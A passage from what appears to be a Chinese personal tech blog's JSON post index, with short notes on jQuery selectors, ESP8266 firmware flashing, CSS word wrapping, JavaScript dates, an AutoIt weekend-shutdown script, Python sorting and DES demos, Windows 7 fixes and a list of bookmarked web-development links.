不用密碼\nhttp://linux988.pixnet.net/blog/post/25926301-fedora,-centos-ssh-%E7%99%BB%E5%85%A5%E5%88%B0%E9%81%A0%E7%AB%AF-server-%E4%B8%8D%E7%94%A8%E5%AF%86%E7%A2%BC","tags":["git"],"categories":["Git"]},{"title":"線上網頁編輯器","url":"%2Fblog%2F2016%2F06%2F29%2Flogdown%2F2016-06-29-online-web-page-editor%2F","content":"http://plnkr.co/\nhttp://codepen.io/\nhttp://jsbin.com/\nhttp://jsfiddle.net/\nhttp://codemagic.gr/\nhttp://www.cssdesk.com/\nhttp://dabblet.com/\nhttp://liveweave.com/","categories":["網站記錄"]},{"title":"[jQuery] :first 和:first-child 不一樣","url":"%2Fblog%2F2016%2F06%2F25%2Flogdown%2F2016-06-25-css-first-and-first-child-not-the-same%2F","content":"由於同事有用我寫的JavaScript做tr跳頁監聽事件\n由於第一欄是input radio不需做跳頁\n我就簡單寫了\n```js\n$('table tr').click(function(){\n    location.href='xxxxxx';\n});\n\n$('table tr:first-child').off('click');\n```\n<!--more-->\n\n同事問我怎麼不用:first，怎麼使用`:first-child`\n他說他改效果一樣\n```\n$('table tr:first').off('click');\n```\n~~瞬間被考倒~~ 我忘了他們的差別\n當然馬上Google腦補一下\n才發現他們不一樣....\n\n:first只會select第一個\n:first-child只會select每個父層的第一個子元素\n\n`:first-child`等於`:nth-child(1)`\n\n還有`:first-of-type`和`:nth-of-type(1)`還是有差\n還有`:nth-last-child(n)`\n有空在記一下筆記\n\n備注:CSS沒有`:first`\n","categories":["JQuery"]},{"title":"[Arduino]新手用 Wifi 晶片 ESP8266 和 USB TTL Serial(PL2303)接上PC","url":"%2Fblog%2F2016%2F06%2F24%2Flogdown%2F2016-06-24-arduino-new-esp8266-and-usb-wifi-chip-ttl-serial-pl2303-connected-to-pc%2F","content":"![thumb.jpg](http://user-image.logdown.io/user/8284/blog/8171/post/745009/bsmdGiIZTWm0zhuttVIV_thumb.jpg)\n最近同事揪來 ~~玩~~ 學Arduino\n由於之前忘記採購到WIFI模組\n同事最近燒壞了WIFI模組(好像接到5v線)\n最近借我了ESP8266和PL2303，叫我好好的玩\n~~那我就大力的玩下去~~\n當然我就簡單找網路上實作\n<!--more-->\n\n\n\n前面參考[*教學*Arduino WIFI(ESP8266) 初次上手應用](http://lolwarden.pixnet.net/blog/post/82031214)\n\n一開始接wifi接到TTL真的不習慣，好不容易照上面教學做完\n花了一些時間，接上電腦上面...竟然找不到驅動\n~~這之前我完全不知道那個USB是TTL又花了一些時間  囧~~\n中間還滿想衝Webduino就不會有這些問題\n有興趣的可以看一下這個[Marty x Will @ 前端工程師的逆襲：使用 Web 技術玩轉 Arduino 開發版 ](https://www.youtube.com/watch?v=P2V2d4aDP8w)\n用win7搜尋TTL驅動[PL2303](http://www.prolific.com.tw/US/ShowProduct.aspx?p_id=225&pcid=41)\n驅動程式就看到\n\n接下來就繼續[*教學*Arduino WIFI(ESP8266) 初次上手應用](http://lolwarden.pixnet.net/blog/post/82031214) Realterm(終端機)\n\n![2016-06-25_171933.png](http://user-image.logdown.io/user/8284/blog/8171/post/745009/zIGKuSYTYyeon44pTLyv_2016-06-25_171933.png)\n\nCH_PD和VCC連在一起要接3v，不然接到5v會有燒掉的風險\n\n照上面教學還是連不到，我就以為接錯線....\n馬上又重看才發現TXD<--->RXD要對接\n所以就重新拔掉重接線\n\n接線發現TTL變白燈(事後才發現這好像才是插錯線)\n我~~興奮啦~~ 感覺這次亮白燈應該就接對線了\n\n但還是試了很久還是失敗orz   最後發現wifi沒有亮\n我還以為是esp8266燒壞了  囧\n\n最終爬掉在重接，TTL亮紅燈 wifi也有亮燈\n就可以用了\n\n[如何燒錄 ESP8266 無線模組的韌體](http://ruten-proteus.blogspot.tw/2014/12/esp8266-firmware-burning.html)\n[ESP8266 更新韌體 ](http://yhhuang1966.blogspot.tw/2015/08/esp8266.html)\n才發現GPIO要接GNP才能進入燒寫模式(一直以為就跟手機刷機一樣XD)\n還要燒四次\n置於他說要額外接上電源，這樣電力才會夠\n但我是用筆電就可以燒入成功\n\n在網路爬文後，需要更新ESP8266韌體才能玩Arduino\n[ESP8266 firmware 燒寫介紹 ](https://www.youtube.com/watch?v=bq71JX25DGg)\n\n從上面官網可以看到[ESP8266Flasher.exe](http://code.unumobile.com/wf8266r/tutorials/esp8266/00_FM)軟體\n燒韌體還是失敗\n\n![2016-06-25_173420.png](http://user-image.logdown.io/user/8284/blog/8171/post/745009/rkkryLTbKKDr3j3vTADS_2016-06-25_173420.png)\n還要抓四個韌體更新[也在這個網站裡的Google Driver](http://code.unumobile.com/wf8266r/tutorials/esp8266/00_FM)\n照著Google Driver文件設定為8MB\n![2016-06-25_173906.png](http://user-image.logdown.io/user/8284/blog/8171/post/745009/tdf9BsPRkKJtedCuRMsA_2016-06-25_173906.png)\n在設定Config **4個設定檔(其中一個一樣) 和 address**\n![2016-06-25_173837.png](http://user-image.logdown.io/user/8284/blog/8171/post/745009/d8NBaxCfTzSNZLtEj6ls_2016-06-25_173837.png)\n點Flash進行燒入，燒入的過程中看到有MAC就表示有成功\n再設定Config把第一個關掉\n![2016-06-25_173929.png](http://user-image.logdown.io/user/8284/blog/8171/post/745009/67UV2S53S96vSgIEytjZ_2016-06-25_173929.png)\n再回去點Flash(重覆4次)就完成\n\n\n開啟Realterm 鮑率打9600\n最後要打`115200`\n網路查了一下，舊版好像是9600，新版才是115200\n要更新韌體才能用Arduino\n但要手動改9600才能用\n拍一下要設定的地方\n\n![2016-06-25_174508.png](http://user-image.logdown.io/user/8284/blog/8171/post/745009/wnVWEXwTSnuqTURcWrcw_2016-06-25_174508.png)\n![2016-06-25_174737.png](http://user-image.logdown.io/user/8284/blog/8171/post/745009/hhYoQutSTR2fZBIl2FnY_2016-06-25_174737.png)\nOPEN是點掉再按下去\n![2016-06-25_175119.png](http://user-image.logdown.io/user/8284/blog/8171/post/745009/mstYMzMTDWXz7ACw4C2l_2016-06-25_175119.png)\n\n```\nAT\n\nOK\n```\n感動\n\n最後發現我常用的pietty也能連\n打指令要用`Enter`後再按`Ctrl+J`\n![2016-06-25_175914.png](http://user-image.logdown.io/user/8284/blog/8171/post/745009/PYJ2giwpTJu2hWAUUqLY_2016-06-25_175914.png)\n好像這個比較方便耶XD\n\n下次用用Arduino連ESP8266\n\n\n\n參考來源：\nhttp://ruten-proteus.blogspot.tw/2014/12/esp8266-firmware-burning.html\nhttp://lets-make-games.blogspot.tw/2015/04/wifi-esp8266-wifi.html\nhttps://mlwmlw.org/2015/07/%E6%B7%B1%E5%85%A5%E6%B7%BA%E5%87%BA-wifi-%E6%99%B6%E7%89%87-esp8266-with-arduino/\nhttps://www.youtube.com/watch?v=bq71JX25DGg\nhttp://ruten-proteus.blogspot.tw/2014/12/esp8266-at-command.html\nhttp://flower-platform.com/2015/12/16/esp8266-with-at-commands-connect-from-pc-with-putty/\nhttp://lets-make-games.blogspot.tw/2015/04/wifi-esp8266-wifi.html\nhttp://code.unumobile.com/wf8266r/tutorials/esp8266/00_FM\nhttp://www.prolific.com.tw/US/ShowProduct.aspx?p_id=225&pcid=41\nhttps://docs.google.com/viewer?a=v&pid=sites&srcid=a3N2cy5raC5lZHUudHd8dGpofGd4OjFiNWM2NGJjMjA4NmZlZjA\nhttps://github.com/nodemcu/nodemcu-flasher/tree/master/Win64/Release\nhttp://yhhuang1966.blogspot.tw/2015/08/esp8266.html","tags":["Arduino"],"categories":["Arduino"]},{"title":"[CSS]文字換行的問題","url":"%2Fblog%2F2016%2F06%2F19%2Flogdown%2F2016-06-19-css-word-wrap-problems%2F","content":"由於最近做一個報表系統，在測試環境下沒有很長的資料，報表表格都沒有什麼問題\n但在正試環境，很多文字就有自動換行的問題，然後爬了文但不清楚這些東西\n花了一個下午時間理解這些東西，順便記一下筆記，不然很久沒用應該就忘掉了 囧\n\nword-break:normal|break-all|keep-all;\nword-wrap:normal|break-word\n\n上面都是解決換行的問題(但不是真的換行)\n\nword-break:Normal\n-----------------------\n<div style=\"border: 1px solid ; width:100px;height:200px;\">\nI am bone of my code. I am bone of my code. I am bone of my code.  I am bone of my codecodecodecodecode.\n</div>\n一般 word-break,word-wrap;都是normal\n這些是截斷英文單字有關係，不是指整行是否段行\n\n*normal下一句有單字超過邊距會把整個單字換下一行*\n\nword-break:keep-all;\n-----------------------\n<div style=\"border: 1px solid ; width:100px;height:200px;word-break:keep-all;\">\nI am bone of my code. I am bone of my code. I am bone of my code.  I am bone of my codecodecodecodecode.\n</div>\n\n恩，結果好像跟Normal模式一樣，沒什麼差別...，但這樣就特錯大錯\n查了一下文件如下\n```\nnormal\n    Use the default line break rule.\nbreak-all\n    Word breaks may be inserted between any character for non-CJK (Chinese/Japanese/Korean) text.\nkeep-all\n    Don't allow word breaks for CJK text. Non-CJK text behavior is the same as for normal.\n```\nhttp://devdocs.io/css/word-break\n\n官網下面範例就很清楚`keep-all`英文下還是以`normal`，但非英文(中文、日文...)不會換行\n這邊我把他想像成   會把一串中文變成一整個單字，所以換行\n<div style=\"border: 1px solid ; width:100px;height:300px;\">\nI am bone of my code. I am bone of my code. I am bone of my code.  I am bone of my codecodecodecodecode.\n此身為碼而生. 此身為碼而生. 此身為碼而生. 此身為碼碼碼碼而生.\n</div>\n一般 word-break,word-wrap;都是`normal`\n這些是截斷英文單字有關係，不是指整行是否段行\nword-break:keep-all;\n<div style=\"border: 1px solid ; width:100px;height:300px;word-break:keep-all;\">\nI am bone of my code. I am bone of my code. I am bone of my code.  I am bone of my codecodecodecodecode.\n此身為碼而生. 此身為碼而生. 此身為碼而生. 此身為碼碼碼碼而生.\n</div>\n\n**剛發現中文與中文之間有空白還是會做換行動作**\n\n好了，接下來要講word-break:break-all;\n\nword-break:break-all\n------------------------\n<div style=\"border: 1px solid ; width:100px;height:300px;word-break:break-all;\">\nI am bone of my code. I am bone of my code. I am bone of my code.  I am bone of my codecodecodecodecode.\n此身為碼而生. 此身為碼而生. 此身為碼而生. 此身為碼碼碼碼而生.\n</div>\n以下結果我們看出英文超出單字不會自動換行\n\n\nwhite-space:nowrap;\n一段不會換行的問題\n\n<div style=\"white-space:nowrap;\">\nI am bone of my code. I am bone of my code. I am bone of my code.  I am bone of my codecodecodecodecode.\n此身為碼而生. 此身為碼而生. 此身為碼而生. 此身為碼碼碼碼而生.\n</div>\n\n我的table不會亂用`word-break:keep-all;`或`white-space:nowrap;`可以解決問題\n\n\n測試還發現`display:block`裡面文字超出去\n但是外框大小不會跟著文字延伸\n`display:inline-block`就沒有這個問題\n上面的div文字會超出去邊框，但table沒有這個問題\n看來有空要搞清楚這些....\n\n","tags":["word-wrap"],"categories":["CSS"]},{"title":"[JavaScript] Date物件  小筆記","url":"%2Fblog%2F2016%2F06%2F12%2Flogdown%2F2016-06-12-javascript-simple-date-object-record%2F","content":"最近有使用JavaScript Date物件，想說有什麼辦法直接把變數換成當月最後一天\n發現網路上有一個教法寫\n```javascript javascript\nvar date = new Date();\ndate.setMonth(date.getMonth+1);\ndate.setDate(0);\nconsole.log(date);\n```\n\n非常神奇，簡單又不需要判斷閏年的問題!!!!\n<!--more-->\n\n\n\n由於同學最近問我有沒有辦法固定網頁的時間先自動調整\n我就簡單看一下，在瀏覽器的GreaseMonkey的腳本來寫JavaScript\n就用了一下Date物件\n```js\nvar input = jQuery('<input value=\"06\">').change(function(){\n\tvar inputMonth = jQuery(this).val();\n\tif(inputMonth.length == 1) inputMonth = '0'+ inputMonth;\n\tvar setDate = new Date(2016,inputMonth,1);\n\tsetDate.setMonth(setDate.getMonth());\n\tsetDate.setDate(0);\n\tvar day = setDate.getDate();\n\n\tjQuery('[name=**a**]').val('2016-' + inputMonth + '-01 00:00');\n\tjQuery('[name=**b**]').val('2016-' + inputMonth + '-' + day + ' 23:59');\n}).change();\n\njQuery('#**a**').before(input);\n```\n\n順便也把他覺得麻煩的readonly拿掉了XD\n~~他以後橫行無阻(誤)~~\n\n這個感覺還滿實用的，先簡單記個筆記\n怕太久沒用就忘了XD\n\n為什麼setDate(0)是抓前一個月最後一天呢??\n我有試著查看MDN的文件，但好像沒特別說setDate(0)\n只看到setDate(32)會是下個月1日，然後又看不太懂ECMASCRIPT文件\n\n最後有在w3cschool看到\n```\nRequired. An integer representing the day of a month.\n\nExpected values are 1-31, but other values are allowed:\n\n    0 will result in the last day of the previous month\n    -1 will result in the day before the last day of the previous month\n\nIf the month has 31 days:\n\n    32 will result in the first day of the next month\n\nIf the month has 30 days:\n\n    32 will result in the second day of the next month\n\n```\n\n比較注意的是呼叫date物件`new Date(year,month-1,day)`，一月month參數為`0`\n\n\n參考來源：\nhttp://www.w3schools.com/jsref/jsref_setdate.asp\nhttp://www.eion.com.tw/Blogger/?Pid=1148\n\n看到有趣應用\nhttp://stackoverflow.com/questions/13745742/setdate-to-the-date-whose-day-is-zero-that-is-sunday\nhttp://jsfiddle.net/phZr7/1/","tags":["Date"],"categories":["JavaScript"]},{"title":"[Autoit]詢問禮拜六日自動關機腳本","url":"%2Fblog%2F2015%2F06%2F22%2Flogdown%2F2015-06-22-autoit-asked-the-week-6th-automated-shutdown-script%2F","content":"就公文開啟腳本加上禮拜六日自動關機程式，不要浪費學校的電\n然後怕卡在國定假日要來上課，所以寫出這個角本\n自動開機就在BIOS設定，就搞定了XD\n\n```vb xxx.au3\n#include <Date.au3>\n\nFunc OpenProc()\n   #Working code\n\nEndFunc\n\nIf @WDAY==1 or @WDAY == 7 Then\n   run(\"shutdown -s -f -t 600\")\n   sleep(5)\n   $goSutdown = MsgBox($MB_OKCANCEL,@WDAY,\"今天是周休假日，程式自動執行關機，請問你是否繼續執行關機？\")\n   If $goSutdown = $IDCANCEL Then\n\t  run(\"shutdown -a\")\n\t  OpenProc()\n   EndIf\n   exit(1)\nEndIf\n\nOpenProc()\n\n```","tags":["AutoIt"],"categories":["AutoIt"]},{"title":"[Python]Conditional expressions和Generator expressions","url":"%2Fblog%2F2015%2F05%2F04%2Flogdown%2F2015-05-04-python-conditional-expressions-and-generator-expressions%2F","content":"之前網路上看到if 和for一行寫法\n今天Google找了一下，發現找不到東西\nKeyWord:if for one line | if for one statement\n\n最後在Python3文件找到[Expressions](https://docs.python.org/3/reference/expressions.html)\n<!--more-->\n\nConditional Expressions有點像ternary operator\n`print(\"True\" if True else False`)\n\n以前常見的ternary operator\n`echo \"True\" ? True:False`\n\n--------\n\nGenerator expressions\n\n","categories":["Python"]},{"title":"[Python]dict排序筆記","url":"%2Fblog%2F2015%2F05%2F04%2Flogdown%2F2015-05-04-pythondict-sort-records%2F","content":"最近突然想到以前有在網路看到Dict做排序\n覺得這些以後還用的到\n所以記錄一下...\n\n```python\n#http://www.saltycrane.com/blog/2007/09/how-to-sort-python-dictionary-by-keys/\nfor key in sorted(mydict.iterkeys()):\n    print \"%s: %s\" % (key, mydict[key])\n\nfor key, value in sorted(mydict.iteritems(), key=lambda (k,v): (v,k)):\n    print \"%s: %s\" % (key, value)\n```\n\n寫成現有method\n```python\n#http://code.activestate.com/recipes/52306-to-sort-a-dictionary/\n    # (IMHO) the simplest approach:\n    def sortedDictValues1(adict):\n        items = adict.items()\n        items.sort()\n        return [value for key, value in items]\n\n    # an alternative implementation, which\n    # happens to run a bit faster for large\n    # dictionaries on my machine:\n    def sortedDictValues2(adict):\n        keys = adict.keys()\n        keys.sort()\n        return [dict[key] for key in keys]\n\n    # a further slight speed-up on my box\n    # is to map a bound-method:\n    def sortedDictValues3(adict):\n        keys = adict.keys()\n        keys.sort()\n        return map(adict.get, keys)\n```\n```python\n#http://falldog7.blogspot.com/2009/10/python-dictionary-or-classitemlistsort.html\n    d= [ {'id':0, 'value':9}, {'id':1, 'value':100}, {'id':5, 'value':99}, {'id':3, 'value':19}, {'id':2, 'value':59} ]\n    d.sort(key=lambda x:x['id']) #針對key 'id' 做sort\n    d.sort(key=lambda x:x['value']) #針對key 'value' 做sort\n\n    #以下用cmp，可以達到上面指定key的效果\n    d.sort(cmp=lambda x,y: cmp(x['id'], y['id']))\n    d.sort(cmp=lambda x,y: cmp(x['value'], y['value']))\n\n    class data:\n        def __init__(self, _id, _value):\n            self.id    = _id\n            self.value = _value\n    c = [ data(0,9), data(1,100), data(5,99), data(3,19), data(2,59) ]\n    c.sort(key=lambda x:x.id)#針對class member id 做sort\n    c.sort(key=lambda x:x.value)#針對class member value 做sort\n\n    #以下用cmp，可以達到上面指定key的效果\n    c.sort(cmp=lambda x,y: cmp(x.id, y.id) )\n    c.sort(cmp=lambda x,y: cmp(x.value, y.value))\n```\n\n\n\n資料來源：http://www.dotblogs.com.tw/rickyteng/archive/2011/12/29/63734.aspx","categories":["Python"]},{"title":"[Python]正規化complie用法","url":"%2Fblog%2F2015%2F04%2F26%2Flogdown%2F2015-04-26-python-the-normalised-complie-usage%2F","content":"http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html","categories":["Python"]},{"title":"[Python]使用pyDes.py動態加密解密","url":"%2Fblog%2F2015%2F04%2F26%2Flogdown%2F2015-04-26-python-use-pydespy-encryption-and-decryption%2F","content":"[pyDes Github](https://github.com/toddw-as/pyDes)\n\n```python test_pyDes.py\nfrom pyDes import *\nimport base64\nimport time\nimport random\n\n\ndata =str(random.random())+\"|\"+\"加密內容\"\nk = des('DESCRYPT', CBC, '12345675', pad=None, padmode=PAD_PKCS5)\nd = k.encrypt(data)\nprint \"Encrypted: %r\" % base64.b64encode(d)\nprint \"Decrypted: %r\" % k.decrypt(d)\n```","categories":["Python"]},{"title":"Win7 的視窗閃動、間歇地出現\"沒有回應\" ","url":"%2Fblog%2F2015%2F03%2F07%2Flogdown%2F2015-03-07-win7-is-window-flashing-intermittent-appear-not-responding%2F","content":"最近同學幫別人灌電腦遇到Win7裡的Office會有閃爍的問題\n結果Google一下，還真的可以解決!!!\n記錄一下，說不定哪天就用到了\n\n```\n一些 電腦優化程序 可能會把 電腦的關閉( Shutdown?? )速度 增加 ，\nWin7 的視窗閃動、間歇地出現\"沒有回應\" ( 並非螢幕黑屏 ) 問題多數是由這所引起的 。\n\n解 :\n1 按左下角的\"開始\"，輸入 \"regedit\" ，開 \"regedit.exe\"，\n   程式的左方應包含一 \"資料夾選巴\"。\n\n2 在選巴中選 \" HKEY_USERS \\ .DEFAULT \\ Control Panel \\ Desktop \"，\n   程式的右方應出現一些 \"登錄值\" ，包含 名稱、類型、資料 等。\n\n3 在 \"登錄值\" 中選取 \" HungAppTimeOut \" 和 \" WaitToKillAppTimeOut \"，點右鍵刪除。\n\n4 在選巴中選 \" HKEY_CURRENT_USER \\ Control Panel \\ Desktop \"。\n\n5 在 \"登錄值\" 中選取 \" HungAppTimeOut \"、\" WaitToKillAppTimeOut \"、\" WaitToKillServiceTimeOut \"，點右鍵刪除。\n\n略解 :\n1 開 登錄編輯程式( Registry Editor ) 。\n\n2 刪除 \" HKEY_USERS \\ .DEFAULT \\ Control Panel \\ Desktop \" 中的 (\" HungAppTimeOut \"、\" WaitToKillAppTimeOut \")。\n\n3 刪除 \" HKEY_CURRENT_USER \\ Control Panel \\ Desktop \" 中的 (\" HungAppTimeOut \"、\" WaitToKillAppTimeOut \"、\" WaitToKillServiceTimeOut \")。\n\n若發現此解適用於其它作業系統 ，請下報。\n\n參自 : www.mydigitallife.info\n```\n\n參考來源：\nWindows7 視窗、畫面、遊戲程式 閃動問題 解決辦法\nhttps://groups.google.com/forum/#!topic/computer_resuce/rDn_21bC2Lk","tags":["視窗閃動"],"categories":["Windows"]},{"title":"wifi抓到驅動但不能連wifi","url":"%2Fblog%2F2015%2F01%2F26%2Flogdown%2F2015-01-26-wifi-caught-driving-but-not-even-wifi%2F","content":"今天幫主任重灌筆電，由於是用我同學整合的Win7安裝\n發現驅動抓到無線網卡，但無線網卡沒法找無線Wifi\n\n\n```\n1.點擊開始菜單，在搜索欄中輸入「services.msc」（輸入時不要打引號），並按下回車。如果此時彈出用戶賬戶控制窗口，請您點擊「繼續」。\n2.分別按順序雙擊打開\"CNG Key Isolation\" \"Extensible Authentication Protocol\" \"WLAN AutoConfig\"服務。點擊「常規」選項卡，確保「啟動類型」是「自動」或者「手動」。然後點擊「服務狀態」下面的「啟用」按鈕。\n\n或者手動啟動三個服務\n1.\n\"CNG Key Isolation\"\n2.\n\"Extensible Authentication Protocol\"\n3.\n\"WLAN AutoConfig\"\n\n```\nhttp://rossic0989.pixnet.net/blog/post/29726514-%E7%84%A1%E6%B3%95%E5%95%9F%E5%8B%95wlan-autoconfig%E9%8C%AF%E8%AA%A4%E4%BB%A3%E7%A2%BC1068%28win7%29\n\n結果是我同學Win7整合服務關掉orz\n讓我搞這麼久","tags":["不能連wifi"],"categories":["Windows"]},{"title":"2015 隨意筆記紀錄","url":"%2Fblog%2F2015%2F01%2F05%2Flogdown%2F2015-01-05-2015-random-notes%2F","content":"[←2014隨意筆記紀錄](230753-2014-random-notes)\n新的一年...新的開始。\n\n<!--more-->\n\n201501\n\n之前2014年看到的滾動適窗skrollr.js，最近又看到幾個\nhttp://blog.friendo.com.tw/posts/240944-prallax-scrolling-by-skrollr\n\nscrollReveal.js\nhttp://scrollrevealjs.org/\n\nanijs\nhttps://github.com/anijs/examples/tree/gh-pages/scrollreveal\nhttp://anijs.github.io/\nhttp://anijs.github.io/examples/scrollreveal/\n\n-----\n\n[譯]為什麼我們找不到前端工程師？\nhttps://zh-tw.facebook.com/notes/lock-chou/%E8%AD%AF%E7%82%BA%E4%BB%80%E9%BA%BC%E6%88%91%E5%80%91%E6%89%BE%E4%B8%8D%E5%88%B0%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%B8%AB/10152095506555563\n\nRightjs\nhttp://rightjs.org/\n\n學習 JavaScript\nhttps://developer.mozilla.org/zh-TW/learn/javascript\n\njQuery Cookie 使用注意事項\nhttp://jocoomadao.logdown.com/posts/249883-jquery-cookie-usage-considerations\n\n難搞的 windows 系統 安裝 sass 篇\nhttp://jamestw.logdown.com/posts/250160-difficult-sass-installed-windows-system-article\n\nLumx\nhttp://ui.lumapps.com/\n\nAngularjsHub\nhttp://www.angularjshub.com/\n\nPython-split (第二參數)\nhttp://kevingo.logdown.com/posts/251938-pythons-split\n\n前進 RWD Grid 設計 - 談Photoshop CS5 網格設計擴充\nhttp://adon988.logdown.com/posts/251966-rwd-grid-design-on-the-fence-design-ready-to-what\n\n[jQuery]使用jQuery對 select 的操作\nhttp://www.dotblogs.com.tw/alanjiang/archive/2011/01/26/21061.aspx\n\n給 Gradle 入門者的 Groovy 語言特性介紹\nhttp://cloudchen.logdown.com/posts/248361/features-of-groovy-for-gradle-beginner\n\n爬蟲服務也上雲端，Kimono讓所有網站都API化\nhttp://www.ithome.com.tw/news/93694\n\n用「Kimono」製作自己的網路爬蟲！\nhttp://typecurry.pixnet.net/blog/post/30665638\n\nJson Web Crawler: 簡化寫爬蟲的 code\nhttp://knovourland.logdown.com/posts/252329-json-web-crawler\n\n\n201502\n------\n\n[CSS]利用CSS製作簡單Tooltip效果\nhttp://monkeybinbin-blog.logdown.com/posts/253999-css-use-css-to-create-a-simple-tooltip-effect\n\n[JS]Websocket with PHP Socket\nhttp://penyin.logdown.com/posts/253523\n\nWebSocket 簡單介紹與 jQuery 實作應用 (手機與電腦結合運用)\nhttp://blog.mukispace.com/websocket-simple-introduce-and-use/\n\nGIT\nhttp://baleezo.logdown.com/posts/253386\n\nModernizr.js 判斷是否支援HTML 5功能\nhttp://wd-blog.logdown.com/posts/254018-modernizrjs-to-determine-whether-to-support-html-5-features\n\nyepnope.js – 異步加載資源文件\nhttp://wd-blog.logdown.com/posts/254016-yepnopejs-asynchronous-loading-of-resources-files\n\nhead.js 讓網站並行加載但順序執行JS\nhttp://wd-blog.logdown.com/posts/254015-headjs-website-of-parallel-loads-but-the-order-executes-js\n\nhtml5up 網頁樣版網站\nhttp://html5up.net\n\n工作必備七萬 clip art 小插圖！最大美工圖庫免費下載\nhttp://www.playpcesor.com/2015/02/clip-art-free-download.html\n\nScrollex\nhttp://n33.co/scrollex\n\nScrolly: a simple jQuery parallax plugin\nhttp://lab.victorcoulon.fr/javascript/scrolly/\n\nAnother 20 Docs and Guides for Front-End Developers\nhttp://www.sitepoint.com/another-20-docs-guides-front-end-developers/\n\nOOCSS——概念篇   *※*\nhttp://www.w3cplus.com/css/oocss-concept\n\n201503\n--------\n\nHow to: CSS Large Background\nhttp://webdesignerwall.com/tutorials/how-to-css-large-background\n\n技能樹\nhttps://raw.githubusercontent.com/justjavac/awesome-awesomeness-zh_CN/master/assets/php-mind-map.jpg\n\n在Python中如何Async的方式呼叫外部程式\nhttp://blog.codylab.com/python-creationflags/\n\nWindows 7 使用指令讓它預約關機!\nhttp://dreamtails.pixnet.net/blog/post/26178309\n\nStylify Me\nhttp://stylifyme.com/\n\nPython2和Python3解惑\nhttp://lovelock-blog.logdown.com/posts/257482-python2-and-python3-faq\n\nFont Awesome\nhttp://fortawesome.github.io/Font-Awesome/\nhttp://lsinyi-blog.logdown.com/posts/257480-font-awesome-icon-with-css-using-teaching\n\ncatfan.me\n- Qatrix(輕量級高性能 JavaScript 框架 )\nhttp://qatrix.com/\n- Medoo (PHP SQL 數據庫框架)\nhttp://medoo.in/\n\n用 data-* 屬性做出純 CSS 的 tooltip\nhttp://blog.mukispace.com/pure-css-tooltip-data-tag/\n\n[CSS] 圓形圖片（更高的可自訂性）\nhttp://shinychang.net/article/53c3f1ff80e3f8c73200c0f7\n\n程式碼準則 by @mdo\nhttp://juanitofatas.com/code-guide/\n\ncoServ(node.js實作精簡的 web serve)\nhttp://www.coservjs.org/coserv/manage?_loc=zh\n\n10步掌握CSS定位: position static relative absolute float\nhttp://www.see-design.com.tw/i/css_position.html\n\nScripting .NET Applications with IronPython\nhttp://www.codeproject.com/Articles/602112/Scripting-NET-Applications-with-IronPython\n\nC#调用Python脚本并使用Python的第三方模块\nhttp://zh.5long.me/2015/dotnet-call-python/\n\nAlternative to execfile in Python 3.2+?\nhttp://stackoverflow.com/questions/6357361/alternative-to-execfile-in-python-3-2\n\n[Tool]Sublime Text 3安裝相關資紀錄(for Windows)\nhttp://monkeybinbin-blog.logdown.com/posts/258838-tool-sublime-text-3-installation-related-funding-record\n\nterrarium\nhttp://www.terrariumapp.com/\n\n201504\n--------\n\n[jQuery] 倒數計時(還有X天X時X分X秒)\nhttp://blog.patw.me/archives/198/jquery-countdown-as-well-as-x-x-x-minutes-x-seconds/\njQuery Timer Plugin\nhttp://darkk6.blogspot.tw/2012/06/jquery-timer-plugin.html\n\nCSS Diner\nhttp://flukeout.github.io/\nCSS Diner 攻略  (其實不只一種答案)\nhttp://railsfun.tw/t/css-diner/63\n\npython dict按照value 排序\nhttp://hi.baidu.com/jackleehit/item/348a312f4c4c68f051fd876e\n\nJavascript - Bubbling V.S Capturing\nhttp://mrjumpy-blog.logdown.com/posts/259761-javascript-event-bubbling-vs-event-capturing\n\n\nhttp://codepen.io/jakealbaugh/full/PwLXXP\n\n想學程式設計，你怎麼能錯過這 31 個學 Coding 的網站\nhttp://buzzorange.com/techorange/2014/03/27/best-resources-to-learn-code/\n\nJavascript 日期處理\nhttp://jerry80409.logdown.com/posts/259925\n\nPython Tutorial 第二堂（3）函式、模組、類別與套件\nhttp://www.codedata.com.tw/python/python-tutorial-the-2nd-class-3-function-module-class-package/\n\n製作免安裝程式\nCameyo\nhttp://blog.joaoko.net/archives/3533\nVMware Thinapp\nhttp://defeatshame.blogspot.com/2010/12/vmware-thinapp-office-2010.html\n\nSQL injection duplicate error\nhttp://vancelin.logdown.com/posts/260140-sql-injection-duplicate-error\n\nDjango Girls 教學手冊\nhttp://djangogirlstaipei.herokuapp.com/tutorials/?hc_location=ufi\n\nFiddler(查看HTTP封包內容)\nhttp://blogs.telerik.com/fiddler/posts/15-03-30/what-s-new-in-fiddler-4-5\n\n透過 Google Maps API 處理 GeoJSON 資料\nhttp://kuro.tw/posts/2015/04/28/through-the-google-maps-api-geojson-data\n\n淺談 Google map Heat map API\nhttp://kuro.tw/posts/2015/04/29/a-brief-talk-on-google-map-heat-map-api\n\n[note] jQuery 與 d3.js 的一些不同之處\nhttp://kuro.tw/posts/2015/04/22/note-jquery-and-d3js-some-of-these-differences\n\n201505\n-------\n\nready4rails4\nhttp://www.ready4rails4.net/\n\nPython 遞迴處理路徑下檔案與資料夾\nhttp://coder.aqualuna.me/2012/01/python.html\n\nPython tips: 什么是\\*args和\\**kwargs？\nhttp://www.cnblogs.com/fengmk2/archive/2008/04/21/1163766.html\n\n推薦五個熱門 Google 材質設計框架 (Material Design Framework)\nhttp://adon988.logdown.com/posts/263691-recommend-some-good-google-material-design-framework\n\nnamedtuple\nhttps://docs.python.org/3/library/collections.html#collections.namedtuple\n\n更好的編寫Python代碼的方式\nhttp://cheng.logdown.com/posts/2015/04/24/better-way-to-write-python\n\n網頁工程師必知：9 個超好用的 CSS 框架\nhttp://buzzorange.com/techorange/2015/05/13/9-css-framework/\n\n快看過來～推薦你 9 個最好用的 JavaScript 開發工具\nhttp://buzzorange.com/techorange/2015/03/03/9-javascript-ide-editor/\n\nBootstrap 免費的theme\nhttp://startbootstrap.com\n\n#繼2015/04 Fiddler，找到類似查看HTTP封包程式\nLivePool\nhttp://code.csdn.net/news/2820655\nhttps://github.com/rehorn/livepool\nRythem\nhttp://www.alloyteam.com/2012/05/web-front-end-tool-rythem-1/\n\nGlobal and Local Variables (Python2)\nhttp://www.python-course.eu/global_vs_local_variables.php\n\nPython 慣用語\nhttp://seanlin.logdown.com/posts/239883-python-idioms\n\nPython之排列组合\nhttp://love67.net/2014/02/09/python-sord-combine/\n\nCycle through list starting at a certain element  [cycle 